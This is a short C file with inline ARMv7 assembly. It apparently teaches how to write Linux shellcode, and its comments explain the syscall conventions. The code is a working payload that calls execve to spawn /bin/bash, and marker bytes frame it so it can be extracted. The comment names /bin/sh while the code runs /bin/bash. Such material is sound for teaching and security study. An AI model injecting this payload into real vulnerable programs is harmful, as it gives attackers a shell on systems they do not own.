/*
  Some background about ARMv7 (A32) system call on Linux:
    instruction: svc #0
    system call number: in r7, e.g., #11 is execve
    (cf. https://chromium.googlesource.com/native_client/nacl-newlib/+/master/libgloss/arm/linux-syscall.h)
    input parameters: r0, r1, r2, r3
    The following code is equivalent to execve("/bin/sh", NULL, NULL)
*/

int main()
{
    asm("\
         .code 32\n\
needle0: b lab1\n\
lab0:    mov r0, r14\n\
         eor r1, r1, r1\n\
         eor r2, r2, r2\n\
         mov r7, #11\n\
         svc #0\n\
lab1:    bl lab0\n\
.ascii   \"/bin/bash\"\n\
needle1: .byte 0x00, 0xde, 0xad, 0xde, 0xad, 0xbe, 0xef\n\
    ");
}
